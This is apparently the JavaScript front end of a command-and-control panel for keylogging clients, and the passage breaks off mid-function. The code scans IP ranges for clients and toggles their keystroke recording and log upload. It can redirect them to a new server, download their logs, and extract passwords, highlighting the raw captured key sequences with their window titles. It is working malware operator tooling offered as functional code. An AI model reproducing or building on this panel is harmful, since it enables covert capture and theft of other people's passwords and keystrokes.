// 全局变量
let ws = null;
let clients = [];
let currentClientId = null;
let reconnectTimer = null;
let reconnectDelay = 1000;
let toastTimer = null;
let isUnloading = false;
let isReconnecting = false;
let reconnectAttempts = 0;
let connectingClients = new Set();
let currentExtractedPasswords = [];
let blacklistPage = 1;
let blacklistPageSize = 20;
let blacklistTotalPages = 1;
const WS_URL = `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}`;
let autoRefreshTimer = null;
const AUTO_REFRESH_INTERVAL = 30000; 
const MAX_RECONNECT_DELAY = 30000;

// DOM 元素
const dom = {
    wsStatus: document.getElementById('wsStatus'),
    wsStatusText: document.getElementById('wsStatusText'),
    clientsTable: document.getElementById('clientsTable'),
    logClientSelect: document.getElementById('logClientSelect'),
    logsTable: document.getElementById('logsTable'),
    scanProgress: document.getElementById('scanProgress'),
    toast: document.getElementById('toast')
};

function normalizePassword(value) {
    return String(value || '').trim();
}

function escapeHtml(value) {
    return String(value || '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

/**
 * 对客户端数组进行排序
 * 排序规则：在线的在前，离线的在后；状态相同时按IP地址排序
 * @param {Array} clients - 客户端数组
 * @returns {Array} 排序后的新数组
 */
function sortClients(clients) {
    return [...clients].sort((a, b) => {
        if (a.status === 'online' && b.status !== 'online') return -1;
        if (a.status !== 'online' && b.status === 'online') return 1;
        return a.ip.localeCompare(b.ip);
    });
}

// 页面切换
document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', () => {
        const page = item.dataset.page;
        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
        document.getElementById(page + 'Page').style.display = 'block';
        if (page === 'logs') {
            populateClientSelect();
            refreshLogs();
            startAutoRefresh();
        } else if (page === 'blacklist') {
            blacklistPage = 1;
            loadBlacklist();
            stopAutoRefresh();
        } else {
            stopAutoRefresh();
        }
    });
});

// 初始化 WebSocket
function connectWebSocket() {
    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;

    if (reconnectTimer) {
        clearTimeout(reconnectTimer);
        reconnectTimer = null;
    }

    ws = new WebSocket(WS_URL);
    ws.onopen = () => {
        dom.wsStatus.classList.add('connected');
        dom.wsStatusText.textContent = '已连接';
        console.info('WebSocket 已连接:', WS_URL);
        const wasReconnect = reconnectAttempts > 0;
        reconnectAttempts = 0;
        isReconnecting = false;
        reconnectDelay = 1000;
        if (reconnectTimer) {
            clearTimeout(reconnectTimer);
            reconnectTimer = null;
        }
        showToast(wasReconnect ? '已重新连接到服务器' : '已连接到服务器', 'success');
    };

    ws.onclose = (event) => {
        dom.wsStatus.classList.remove('connected');
        dom.wsStatusText.textContent = '已断开';
        ws = null;
        console.warn('WebSocket 关闭:', event.code, event.reason);

        if (isUnloading) return;

        if (event && event.code === 1008) {
            dom.wsStatusText.textContent = '未授权，连接已关闭';
            showToast('WebSocket 未授权，请重新登录', 'error');
            return;
        }

        if (!isReconnecting) {
            showToast('与服务器断开，正在重连...', 'error');
        }
        isReconnecting = true;
        reconnectTimer = setTimeout(() => {
            reconnectAttempts += 1;
            connectWebSocket();
        }, reconnectDelay);
        reconnectDelay = Math.min(MAX_RECONNECT_DELAY, reconnectDelay * 1.5);
    };

    ws.onerror = (err) => {
        console.error('WebSocket 错误:', err);
    };

    ws.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            handleWebSocketMessage(data);
        } catch (e) {
            console.error('解析消息失败:', e);
        }
    };
}

// 处理 WebSocket 消息
function handleWebSocketMessage(data) {
    switch (data.type) {
        case 'clients_list':
            clients = data.clients;
            renderClientsTable();
            populateClientSelect();
            break;
        case 'client_connected':
        case 'client_offline':
        case 'client_updated':
            if (data.client) {
                updateClientInList(data.client);
            } else if (data.clientId) {
                removeClientFromList(data.clientId);
            }
            populateClientSelect();
            break;
        case 'client_deleted':
            if (data.clientId) {
                removeClientFromList(data.clientId);
            }
            populateClientSelect();
            break;
        case 'client_response':
            console.log('客户端响应:', data);
            if (data.response && data.response.data) {
                const client = clients.find(c => c.id === data.clientId);
                if (client) {
                    if (data.response.data.recording !== undefined) {
                        client.recording = data.response.data.recording;
                    }
                    if (data.response.data.upload_enabled !== undefined) {
                        client.uploadEnabled = data.response.data.upload_enabled;
                    }
                    renderClientsTable();
                }
            }
            break;
        case 'command_result':
            console.log('命令结果:', data.result);
            if (data.result.success) {
                showToast('命令已发送', 'success');
            } else {
                showToast('命令发送失败: ' + data.result.error, 'error');
            }
            break;
        case 'broadcast_result':
            const successCount = data.results.filter(r => r.success).length;
            showToast(`广播完成: ${successCount}/${data.results.length} 成功`, 'success');
            break;
        case 'scan_complete':
            dom.scanProgress.classList.remove('show');
            showToast(`扫描完成，发现 ${data.found.length} 个客户端`, 'success');
            break;
        case 'scan_error':
            dom.scanProgress.classList.remove('show');
            showToast('扫描失败: ' + data.message, 'error');
            break;
        case 'connect_result':
            if (data.client) {
                showToast(`成功连接 ${data.client.ip}:${data.client.port}`, 'success');
                hideModal('connectModal');
                // 移除连接中标记
                connectingClients.delete(data.client.id);
                renderClientsTable();
            } else {
                showToast('连接失败：服务器无响应', 'error');//直接刷新列表
            }
            break;
        case 'connect_error':
            if (data.clientId) {
                connectingClients.delete(data.clientId);
                renderClientsTable();
            }
            showToast('连接失败: ' + data.message, 'error');
            break;
        case 'disconnect_result':
            if (data.success) {
                showToast('客户端已断开', 'success');
            } else {
                showToast('断开失败: ' + (data.message || '未知错误'), 'error');
            }
            break;
        case 'delete_result':
            if (data.success) {
                showToast('客户端已删除', 'success');
            } else {
                showToast('删除失败: ' + data.error, 'error');
            }
            break;
        case 'error':
            showToast('服务器错误: ' + data.message, 'error');
            break;
        default:
            console.log('未知消息类型:', data);
    }
}

// 更新客户端列表中的某个客户端
function updateClientInList(client) {
    const index = clients.findIndex(c => c.id === client.id);
    if (index >= 0) {
        clients[index] = client;
    } else {
        clients.push(client);
    }
    renderClientsTable();
}

// 从列表中移除客户端
function removeClientFromList(clientId) {
    clients = clients.filter(c => c.id !== clientId);
    renderClientsTable();
    populateClientSelect();
}

// 渲染客户端表格
// 渲染客户端表格
function renderClientsTable() {
    if (clients.length === 0) {
        dom.clientsTable.innerHTML = '<tr><td colspan="7" class="empty-state">暂无客户端</td></tr>';
        return;
    }

    // 按照连接状态排序：在线的在前面，离线的在后面
    const sortedClients = sortClients(clients);

    let html = '';
    sortedClients.forEach(client => {
        const statusClass = client.status === 'online' ? 'status-online' : 'status-offline';
        const recordClass = client.recording ? 'status-recording' : 'status-paused';
        const uploadClass = client.uploadEnabled ? 'status-recording' : 'status-paused';
        const lastSeen = client.lastSeen ? new Date(client.lastSeen).toLocaleString() : '从未';
        const safeId = escapeHtml(client.id);
        const safeIp = escapeHtml(client.ip);
        const safePort = escapeHtml(client.port);
        const safeStatus = escapeHtml(client.status);
        const isConnecting = connectingClients.has(client.id);

        let actionButtons = `
            <button class="btn btn-sm btn-primary" onclick="showClientModal('${safeId}')">
                <i class="fas fa-info-circle"></i> 详情
            </button>
        `;

        if (client.status === 'online') {
            actionButtons += `<button class="btn btn-sm btn-warning" onclick="disconnectClient('${safeId}')">
                <i class="fas fa-times-circle"></i> 断开
            </button>`;
        } else {
            const connectBtnText = isConnecting 
                ? '<span class="btn-spinner"></span> 连接中' 
                : '<i class="fas fa-plug"></i> 连接';
            const disabledAttr = isConnecting ? 'disabled' : '';
            actionButtons += `<button class="btn btn-sm btn-success" onclick="connectClient('${safeIp}', ${safePort}, '${safeId}')" ${disabledAttr}>${connectBtnText}</button>`;
        }
        actionButtons += `<button class="btn btn-sm btn-danger" onclick="deleteClient('${safeId}')">
            <i class="fas fa-trash"></i> 删除
        </button>`;

        html += `<tr>
            <td>${safeIp}</td>
            <td>${safePort}</td>
            <td><span class="status-badge ${statusClass}">${safeStatus}</span></td>
            <td><span class="status-badge ${recordClass}">${client.recording ? '录制中' : '已暂停'}</span></td>
            <td><span class="status-badge ${uploadClass}">${client.uploadEnabled ? '已启用' : '未启用'}</span></td>
            <td>${escapeHtml(lastSeen)}</td>
            <td>
                <div class="action-btns">
                    ${actionButtons}
                </div>
            </td>
        </tr>`;
    });
    dom.clientsTable.innerHTML = html;
}

// 填充日志页面的客户端下拉框
function populateClientSelect() {
    // 按照连接状态排序：在线的在前面，离线的在后面
    const sortedClients = sortClients(clients);

    let html = '<option value="">全部</option>';
    sortedClients.forEach(client => {
        html += `<option value="${escapeHtml(client.id)}">${escapeHtml(client.ip)}:${escapeHtml(client.port)} (${escapeHtml(client.status)})</option>`;
    });
    dom.logClientSelect.innerHTML = html;
}

// 显示客户端详情模态框
function showClientModal(clientId) {
    const client = clients.find(c => c.id === clientId);
    if (!client) return;

    currentClientId = clientId;
    document.getElementById('clientModalTitle').textContent = `客户端: ${client.ip}:${client.port}`;
    
    // 概览信息
    const infoHtml = `
        <p><strong>ID:</strong> ${escapeHtml(client.id)}</p>
        <p><strong>IP:</strong> ${escapeHtml(client.ip)}</p>
        <p><strong>端口:</strong> ${escapeHtml(client.port)}</p>
        <p><strong>状态:</strong> ${escapeHtml(client.status)}</p>
        <p><strong>录制状态:</strong> ${client.recording ? '录制中' : '已暂停'}</p>
        <p><strong>上传状态:</strong> ${client.uploadEnabled ? '已启用' : '未启用'}</p>
        <p><strong>最后连接:</strong> ${escapeHtml(client.lastSeen ? new Date(client.lastSeen).toLocaleString() : '从未')}</p>
    `;
    document.getElementById('clientInfo').innerHTML = infoHtml;

    // 加载客户端日志列表
    loadClientLogs(clientId);

    document.getElementById('clientModal').classList.add('show');
}

// 获取日志文件信息
function getLogsInfo() {
    sendCommand('get_logs_info');
}

// 删除指定日志
function deleteClientLog(filename) {
    if (!confirm(`确定要删除日志文件 ${filename} 吗？此操作不可恢复！`)) {
        return;
    }
    sendCommand('delete_log', { file: filename });
}

// 暂停录制
function pauseRecord() {
    sendCommand('pause_record');
}

// 恢复录制
function resumeRecord() {
    sendCommand('resume_record');
}

// 获取完整状态
function getStatus() {
    sendCommand('get_status');
}

// 立即上传
function uploadOnce() {
    const count = parseInt(document.getElementById('uploadCount').value) || 1;
    sendCommand('upload_once', { count });
}

// 加载客户端日志
async function loadClientLogs(clientId) {
    const client = clients.find(c => c.id === clientId);
    if (!client) return;

    try {
        const response = await fetch(`/api/clients/${clientId}/logs`);
        const logs = await response.json();
        if (logs.length === 0) {
            document.getElementById('clientLogs').innerHTML = '<p>暂无日志文件</p>';
            return;
        }
        let html = '<ul style="list-style: none; padding: 0;">';
        logs.forEach(log => {
            const safeFilename = escapeHtml(log.filename);
            const safeClientId = escapeHtml(clientId);
            html += `<li style="padding: 0.5rem; border-bottom: 1px solid rgba(255,255,255,0.08); display: flex; justify-content: space-between; align-items: center;">
                <span>${safeFilename}</span>
                <div class="action-btns">
                    <button class="btn btn-sm btn-primary" onclick="viewLog('${safeClientId}', '${safeFilename}')">查看</button>
                    <button class="btn btn-sm btn-success" onclick="downloadLog('${safeClientId}', '${safeFilename}')">下载</button>
                    <button class="btn btn-sm btn-danger" onclick="deleteLog('${safeClientId}', '${safeFilename}')">删除</button>
                </div>
            </li>`;
        });
        html += '</ul>';
        document.getElementById('clientLogs').innerHTML = html;
    } catch (e) {
        console.error('加载日志失败:', e);
        document.getElementById('clientLogs').innerHTML = '<p>加载失败</p>';
    }
}

// 模态框标签切换
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
        const tabName = tab.dataset.tab;
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        tab.classList.add('active');
        document.getElementById(tabName + 'Tab').classList.add('active');
    });
});

// 发送命令给当前选中的客户端
function sendCommand(action, params = {}) {
    if (!currentClientId) {
        showToast('请先选择客户端', 'error');
        return;
    }
    ws.send(JSON.stringify({
        type: 'command',
        clientId: currentClientId,
        command: { action, ...params }
    }));
}

// 广播命令
function broadcastCommand(action, params = {}) {
    ws.send(JSON.stringify({
        type: 'broadcast_command',
        command: { action, ...params }
    }));
}

// 设置服务器地址
function setServer() {
    const host = document.getElementById('serverHost').value;
    const port = document.getElementById('serverPort').value;
    if (!host || !port) {
        showToast('请填写服务器地址和端口', 'error');
        return;
    }
    sendCommand('set_server', { host, port: parseInt(port) });
}

// 断开客户端连接
function disconnectClient(clientId) {
    if (!confirm('确定断开该客户端连接吗？')) return;
    ws.send(JSON.stringify({
        type: 'disconnect_client',
        clientId: clientId
    }));
}

// 删除客户端
function deleteClient(clientId) {
    if (!confirm('确定要删除该客户端吗？此操作会从数据库中永久移除记录。')) return;
    ws.send(JSON.stringify({
        type: 'delete_client',
        clientId: clientId
    }));
    if (currentClientId === clientId) {
        hideModal('clientModal');
    }
}

// 手动连接（模态框调用）
function manualConnect() {
    const ip = document.getElementById('connectIp').value;
    const port = parseInt(document.getElementById('connectPort').value);
    if (!ip || !port) {
        showToast('请填写 IP 和端口', 'error');
        return;
    }
    ws.send(JSON.stringify({
        type: 'manual_connect',
        ip, port
    }));
}

// 连接单个客户端（供按钮调用）
function connectClient(ip, port, clientId) {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        showToast('WebSocket 未连接', 'error');
        return;
    }
    // 添加到连接中集合
    connectingClients.add(clientId);
    // 重新渲染表格以显示连接中状态
    renderClientsTable();
    ws.send(JSON.stringify({
        type: 'manual_connect',
        ip,
        port
    }));
    showToast(`正在尝试连接 ${ip}:${port}...`, 'success');
}

// 一键连接全部离线客户端
function connectAllClients() {
    const offlineClients = clients.filter(c => c.status === 'offline');
    if (offlineClients.length === 0) {
        showToast('没有离线客户端', 'error');
        return;
    }
    showToast(`正在尝试连接 ${offlineClients.length} 个离线客户端...`, 'success');
    offlineClients.forEach(client => {
        connectClient(client.ip, client.port, client.id);
    });
}

// 扫描网络
function scanNetwork() {
    const startIp = document.getElementById('scanStartIp').value;
    const endIp = document.getElementById('scanEndIp').value;
    const portsStr = document.getElementById('scanPorts').value;
    if (!startIp || !endIp) {
        showToast('请填写起始和结束 IP', 'error');
        return;
    }
    const ports = portsStr.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p));
    ws.send(JSON.stringify({
        type: 'scan_network',
        startIp, endIp, ports
    }));
    dom.scanProgress.classList.add('show');
    hideModal('scanModal');
}

// 刷新日志列表（日志页面）
async function refreshLogs() {
    const clientId = dom.logClientSelect.value;
    try {
        let logs, fetchClientId;
        if (clientId) {
            const response = await fetch(`/api/clients/${clientId}/logs`);
            logs = await response.json();
            fetchClientId = clientId;
        } else {
            const response = await fetch('/api/logs');
            logs = await response.json();
            fetchClientId = null;
        }
        renderLogsTable(logs, fetchClientId);
    } catch (e) {
        console.error('刷新日志失败:', e);
        showToast('刷新失败', 'error');
    }
}

// 渲染日志表格（包含删除按钮）
function renderLogsTable(logs, clientId) {
    if (logs.length === 0) {
        dom.logsTable.innerHTML = '<tr><td colspan="4" class="empty-state">暂无日志文件</td></tr>';
        return;
    }
    let html = '';
    logs.forEach(log => {
        const size = formatFileSize(log.size);
        const time = log.uploadTime ? new Date(log.uploadTime).toLocaleString() : '未知';
        let logClientId = clientId;
        if (!logClientId) {
            const ipMatch = log.filename.match(/^(\d+\.\d+\.\d+\.\d+)_/);
            if (ipMatch) {
                const ip = ipMatch[1];
                const client = clients.find(c => c.ip === ip);
                logClientId = client ? client.id : `${ip}:9999`;
            }
        }
        if (logClientId) {
            html += `<tr>
                <td>${escapeHtml(log.filename)}</td>
                <td>${size}</td>
                <td>${time}</td>
                <td>
                    <div class="action-btns">
                        <button class="btn btn-sm btn-primary" onclick="viewLog('${escapeHtml(logClientId)}', '${escapeHtml(log.filename)}')">
                            <i class="fas fa-eye"></i> 查看
                        </button>
                        <button class="btn btn-sm btn-success" onclick="downloadLog('${escapeHtml(logClientId)}', '${escapeHtml(log.filename)}')">
                            <i class="fas fa-download"></i> 下载
                        </button>
                        <button class="btn btn-sm btn-danger" onclick="deleteLog('${escapeHtml(logClientId)}', '${escapeHtml(log.filename)}')">
                            <i class="fas fa-trash"></i> 删除
                        </button>
                    </div>
                </td>
            </tr>`;
        }
    });
    dom.logsTable.innerHTML = html;
}

// 查看日志内容
async function viewLog(clientId, filename) {
    try {
        const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
        const content = await response.text();
        document.getElementById('logModalTitle').textContent = filename;
        document.getElementById('logContent').textContent = content;
        document.getElementById('logModal').classList.add('show');
    } catch (e) {
        console.error('查看日志失败:', e);
        showToast('查看失败', 'error');
    }
}

// 查看日志内容并滚动到包含密码的行
// 查看日志内容并滚动到包含原始密码数据的行
async function viewLogWithPassword(clientId, filename, password, rawPassword) {
    try {
        const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
        
        if (!response.ok) {
            throw new Error(`服务器返回错误: ${response.status}`);
        }
        
        const content = await response.text();
        document.getElementById('logModalTitle').textContent = filename;
        
        // 创建高亮HTML内容：仅高亮原始数据（如果存在），否则高亮解析后的密码
        let highlightedContent = content;
        
        if (rawPassword) {
            // 仅高亮原始按键序列，转义正则特殊字符
            const escapedRawPassword = rawPassword.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            highlightedContent = highlightedContent.replace(
                new RegExp(escapedRawPassword, 'g'), 
                `<span class="raw-password-highlight">${rawPassword}</span>`
            );
        } else {
            // 如果没有原始数据，才高亮解析后的密码（兜底），转义正则特殊字符
            const escapedPassword = password.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            highlightedContent = highlightedContent.replace(
                new RegExp(escapedPassword, 'g'), 
                `<span class="password-highlight">${password}</span>`
            );
        }
        
        // 使用 innerHTML 支持高亮样式
        document.getElementById('logContent').innerHTML = highlightedContent;
        document.getElementById('logModal').classList.add('show');
        
        // 滚动到第一个高亮位置（优先原始数据）
        setTimeout(() => {
            let highlight = document.querySelector('.raw-password-highlight') || document.querySelector('.password-highlight');
            if (highlight) {
                highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
                // 添加闪烁效果
                highlight.classList.add('blink');
                setTimeout(() => {
                    highlight.classList.remove('blink');
                }, 2000);
            }
        }, 100);
    } catch (e) {
        console.error('查看日志失败:', e);
        showToast('查看失败，文件可能不存在或已被删除', 'error');
    }
}

// 下载日志
function downloadLog(clientId, filename) {
    window.open(`/api/clients/${clientId}/logs/${filename}/download`, '_blank');
}

// 删除日志
async function deleteLog(clientId, filename) {
    if (!confirm(`确定要删除日志文件 ${filename} 吗？此操作不可恢复！`)) {
        return;
    }

    try {
        const response = await fetch(`/api/clients/${clientId}/logs/${filename}`, {
            method: 'DELETE'
        });
        const result = await response.json();
        if (response.ok) {
            showToast(`日志 ${filename} 已删除`, 'success');
            // 刷新当前显示的日志列表
            if (currentClientId === clientId && document.getElementById('clientModal').classList.contains('show')) {
                loadClientLogs(clientId);
            }
            if (dom.logClientSelect.value === clientId) {
                refreshLogs();
            }
        } else {
            showToast(`删除失败: ${result.error || '未知错误'}`, 'error');
        }
    } catch (e) {
        console.error('删除日志失败:', e);
        showToast('删除请求失败', 'error');
    }
}

// 格式化文件大小
function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
}

// 显示模态框
function showConnectModal() {
    document.getElementById('connectModal').classList.add('show');
}

function showScanModal() {
    document.getElementById('scanModal').classList.add('show');
}

function hideModal(modalId) {
    document.getElementById(modalId).classList.remove('show');
}

// 保存设置
function saveSettings() {
    const interval = document.getElementById('heartbeatInterval').value;
    const timeout = document.getElementById('connectTimeout').value;
    showToast(`设置已保存 (心跳: ${interval}ms, 超时: ${timeout}ms)`, 'success');
}

async function loadBlacklist(page = 1) {
    try {
        blacklistPage = page;
        const response = await fetch(`/api/blacklist?page=${blacklistPage}&limit=${blacklistPageSize}`);
        if (!response.ok) {
            throw new Error('加载黑名单失败');
        }

        const data = await response.json();
        const rows = data.blacklist || [];
        blacklistTotalPages = data.totalPages || 1;
        blacklistPage = data.page || blacklistPage;
        const table = document.getElementById('blacklistTable');
        if (rows.length === 0) {
            table.innerHTML = `<tr><td colspan="3" class="empty-state">暂无屏蔽密码</td></tr>`;
        } else {
            let html = '';
            rows.forEach(row => {
                html += `
                    <tr data-id="${row.id}">
                        <td>${escapeHtml(row.password)}</td>
                        <td>${escapeHtml(row.created_at)}</td>
                        <td>
                            <button class="btn btn-sm btn-danger" onclick="deleteBlacklistEntry(${row.id})">
                                <i class="fas fa-trash"></i> 取消屏蔽
                            </button>
                        </td>
                    </tr>
                `;
            });
            table.innerHTML = html;
        }

        document.getElementById('blacklistPagerInfo').textContent = `第 ${blacklistPage} 页 / ${blacklistTotalPages} 页`;
    } catch (e) {
        console.error('加载黑名单失败:', e);
        showToast('加载黑名单失败', 'error');
    }
}

function changeBlacklistPage(delta) {
    const targetPage = blacklistPage + delta;
    if (targetPage < 1 || targetPage > blacklistTotalPages) {
        return;
    }
    loadBlacklist(targetPage);
}

async function deleteBlacklistEntry(id) {
    if (!confirm('确认删除该屏蔽密码？此操作不可恢复。')) {
        return;
    }

    try {
        const response = await fetch(`/api/blacklist/${id}`, {
            method: 'DELETE'
        });
        const result = await response.json();

        if (!response.ok || !result.success) {
            throw new Error(result.error || '删除失败');
        }

        showToast('已删除黑名单项', 'success');
        loadBlacklist();
    } catch (e) {
        console.error('删除黑名单失败:', e);
        showToast(e.message || '删除黑名单失败', 'error');
    }
}

// Toast 提示
function showToast(message, type = 'success') {
    const icon = type === 'success' ? '<i class="fas fa-check-circle"></i>' : '<i class="fas fa-exclamation-circle"></i>';
    dom.toast.innerHTML = `${icon} ${message}`;
    dom.toast.className = `toast ${type} show`;
    if (toastTimer) {
        clearTimeout(toastTimer);
    }
    toastTimer = setTimeout(() => {
        dom.toast.classList.remove('show');
        toastTimer = null;
    }, 3000);
}

// 日志页面客户端选择变化
dom.logClientSelect.addEventListener('change', () => {
    refreshLogs();
    if (autoRefreshTimer) {
        stopAutoRefresh();
        startAutoRefresh();
    }
});

// 日志搜索过滤
document.getElementById('logSearch')?.addEventListener('input', (e) => {
    const keyword = e.target.value.toLowerCase();
    const rows = dom.logsTable.querySelectorAll('tr');
    rows.forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(keyword) ? '' : 'none';
    });
});

document.getElementById('blacklistSearch')?.addEventListener('input', (e) => {
    const keyword = e.target.value.toLowerCase();
    const rows = document.querySelectorAll('#blacklistTable tr');
    rows.forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(keyword) ? '' : 'none';
    });
});

//自动刷新
function startAutoRefresh() {
    if (autoRefreshTimer) return;
    autoRefreshTimer = setInterval(() => {
        refreshLogs();
    }, AUTO_REFRESH_INTERVAL);
}

function stopAutoRefresh() {
    if (autoRefreshTimer) {
        clearInterval(autoRefreshTimer);
        autoRefreshTimer = null;
    }
}

// 提取密码
async function extractPasswords() {
    try {
        showToast('正在提取密码...', 'success');
        const response = await fetch('/api/extract-passwords', {
            method: 'POST'
        });
        const result = await response.json();
        if (result.success) {
            showToast(`成功提取 ${result.count} 个密码，已保存到 extracted_passwords.txt`, 'success');
        } else {
            showToast(`提取失败: ${result.error || '未知错误'}`, 'error');
        }
    } catch (e) {
        console.error('提取密码失败:', e);
        showToast('提取请求失败', 'error');
    }
}

// 查看密码提取结果
async function viewLatestPasswords() {
    try {
        // 直接从服务器本地读取提取结果文件
        const response = await fetch('/api/extract-passwords/view');
        console.log('查看提取结果响应状态:', response.status);
        if (response.ok) {
            const content = await response.text();
            console.log('提取结果内容长度:', content.length);
            
            // 解析提取结果
            let passwords = parseExtractedPasswords(content);
            
            // 获取黑名单并过滤当前提取结果
            try {
                const blacklistResponse = await fetch('/api/blacklist');
                if (blacklistResponse.ok) {
                    const data = await blacklistResponse.json();
                    const blacklistSet = new Set((data.blacklist || []).map(item => normalizePassword(item.password)));
                    passwords = passwords.filter(item => !blacklistSet.has(normalizePassword(item.password)));
                }
            } catch (e) {
                console.warn('获取黑名单失败，继续显示提取结果', e);
            }
            
            // 显示提取结果
            displayExtractedPasswords(passwords);
            
            // 显示模态框
            document.getElementById('extractModal').classList.add('show');
        } else {
            const errorText = await response.text();
            console.error('查看提取结果失败:', errorText);
            showToast(`查看失败: ${errorText}`, 'error');
        }
    } catch (e) {
        console.error('查看密码提取结果失败:', e);
        showToast('查看失败，可能还没有提取过密码', 'error');
    }
}

// 解析提取的密码）
function parseExtractedPasswords(content) {
    const passwords = [];
    // 按空行分割记录（每条记录之间通常有空行）
    const blocks = content.split(/\n\s*\n/);
    
    for (const block of blocks) {
        const trimmed = block.trim();
        if (!trimmed) continue;
        
        // 提取第一条记录的开头 "数字. 来自: 文件名"
        const headerMatch = trimmed.match(/^(\d+)\.\s*来自\s*:\s*(.+)$/m);
        if (!headerMatch) continue;
        
        const passwordItem = {
            index: parseInt(headerMatch[1], 10),
            file: headerMatch[2].trim(),
            window: '',
            timestamp: '',
            password: '',
            rawPassword: ''
        };
        
        // 提取窗口
        const windowMatch = trimmed.match(/^窗口\s*:\s*(.+)$/m);
        if (windowMatch) passwordItem.window = windowMatch[1].trim();
        
        // 提取时间
        const timeMatch = trimmed.match(/^时间\s*:\s*(.+)$/m);
        if (timeMatch) passwordItem.timestamp = timeMatch[1].trim();
        
        // 提取内容（支持跨行内容，直到遇到 "原始数据:" 或结束）
        const contentMatch = trimmed.match(/^内容\s*:\s*([\s\S]*?)(?=\n原始数据\s*:|$)/m);
        if (contentMatch) passwordItem.password = contentMatch[1].trim();
        
        // 提取原始数据
        const rawMatch = trimmed.match(/^原始数据\s*:\s*([\s\S]*)$/m);
        if (rawMatch) passwordItem.rawPassword = rawMatch[1].trim();
        
        passwords.push(passwordItem);
    }
    
    return passwords;
}

// 显示提取的密码
function displayExtractedPasswords(passwords) {
    const extractList = document.getElementById('extractList');
    const extractStats = document.getElementById('extractStats');
    
    // 更新统计信息
    extractStats.textContent = `共 ${passwords.length} 个密码`;
    
    if (passwords.length === 0) {
        extractList.innerHTML = `
            <div class="extract-empty">
                <i class="fas fa-key"></i>
                <p>暂无提取的密码</p>
            </div>
        `;
        return;
    }
    
    // 生成密码列表
    let html = '';
    passwords.forEach((item, index) => {
        // 提取客户端ID和文件名
        let clientId = '';
        let filename = item.file;
        
        // 尝试从文件名中提取客户端ID
        const ipMatch = item.file.match(/^(\d+\.\d+\.\d+\.\d+)_/);
        if (ipMatch) {
            const ip = ipMatch[1];
            const client = clients.find(c => c.ip === ip);
            clientId = client ? client.id : `${ip}:9999`;
        }
        
        // 为每个项目添加唯一标识符
        const itemId = `password-item-${index}`;
        
        html += `
            <div class="extract-item" id="${itemId}">
                <div class="index">${item.index}</div>
                <div class="password-content">
                    ${escapeHtml(item.password)}
                    ${item.rawPassword ? `
                        <div class="raw-password" style="font-size: 0.8rem; color: var(--gray); margin-top: 0.5rem;">
                            <span style="font-weight: 600;">原始数据:</span> ${escapeHtml(item.rawPassword)}
                        </div>
                    ` : ''}
                </div>
                <div class="source-file">
                    <a href="javascript:void(0)" class="source-file-link" data-client-id="${escapeHtml(clientId)}" data-filename="${escapeHtml(filename)}" data-password="${escapeHtml(item.password)}" data-raw-password="${escapeHtml(item.rawPassword || '')}" style="color: var(--primary); text-decoration: underline; cursor: pointer;">
                        ${escapeHtml(item.file)}
                    </a>
                </div>
                <div class="action-cell">
                    <button class="btn btn-sm btn-secondary blacklist-password-btn" data-index="${index}" style="padding: 0.35rem 0.75rem; min-width: 110px;">
                        不再显示
                    </button>
                </div>
                <div class="timestamp">${escapeHtml(item.timestamp)}</div>
            </div>
        `;
    });
    
    currentExtractedPasswords = passwords;
    extractList.innerHTML = html;
    
    // 添加点击事件处理程序
    extractList.onclick = async function(e) {
        const link = e.target.closest('.source-file-link');
        if (link) {
            const clientId = link.dataset.clientId;
            const filename = link.dataset.filename;
            const password = link.dataset.password;
            const rawPassword = link.dataset.rawPassword;
            viewLogWithPassword(clientId, filename, password, rawPassword);
            return;
        }

        const button = e.target.closest('.blacklist-password-btn');
        if (button) {
            const index = Number(button.dataset.index);
            const itemElement = button.closest('.extract-item');
            const password = currentExtractedPasswords[index] ? currentExtractedPasswords[index].password : '';
            await blacklistExtractedPassword(itemElement, password);
        }
    };
    
    // 添加搜索功能
    const searchInput = document.getElementById('extractSearch');
    searchInput.oninput = function() {
        const searchTerm = this.value.toLowerCase();
        const items = extractList.querySelectorAll('.extract-item');
        
        items.forEach(item => {
            const password = item.querySelector('.password-content').textContent.toLowerCase();
            const file = item.querySelector('.source-file').textContent.toLowerCase();
            
            if (password.includes(searchTerm) || file.includes(searchTerm)) {
                item.style.display = '';
            } else {
                item.style.display = 'none';
            }
        });
    };
}

async function blacklistExtractedPassword(itemElement, password) {
    if (!password) {
        showToast('无法加入黑名单：密码内容为空', 'error');
        return;
    }

    try {
        const response = await fetch('/api/blacklist', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ password })
        });

        if (!response.ok) {
            const error = await response.json().catch(() => ({}));
            throw new Error(error.error || '加入黑名单失败');
        }

        if (itemElement) {
            itemElement.remove();
            currentExtractedPasswords = currentExtractedPasswords.filter(item => normalizePassword(item.password) !== normalizePassword(password));
            const extractStats = document.getElementById('extractStats');
            const currentCount = parseInt(extractStats.textContent.replace(/\D/g, '')) || 0;
            extractStats.textContent = `共 ${Math.max(currentCount - 1, 0)} 个密码`;
        }

        showToast('已加入黑名单，后续提取时将跳过该密码', 'success');
    } catch (e) {
